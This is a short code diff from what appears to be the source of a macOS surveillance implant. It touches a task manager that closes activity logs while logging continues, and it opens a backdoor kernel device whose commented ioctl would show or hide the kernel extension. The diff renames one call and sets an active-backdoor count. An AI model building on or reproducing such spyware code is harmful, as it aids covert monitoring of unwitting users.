@@ -30,6 +30,7 @@
 //#define DEBUG
 //#define NO_START_AT_LAUNCH
 
+
 static RCSMTaskManager *sharedTaskManager = nil;
 static NSLock *gTaskManagerLock           = nil;
 static NSLock *gSyncLock                  = nil;
@@ -396,7 +397,7 @@ static NSLock *gSyncLock                  = nil;
 #endif
           
           RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
-          if ([_logManager closeActiveLogs: NO])
+          if ([_logManager closeActiveLogsAndContinueLogging: NO])
             {
 #ifdef DEBUF
               infoLog(ME, @"Active logs closed correctly");
@@ -424,7 +425,7 @@ static NSLock *gSyncLock                  = nil;
           
           int kextFD  = open(BDOR_DEVICE, O_RDWR);
           int ret     = 0;
-          int activeBackdoors = -1;
+          int activeBackdoors = 1;
           
           // Show KEXT
           //ret = ioctl(kextFD, MCHOOK_SHOWK);
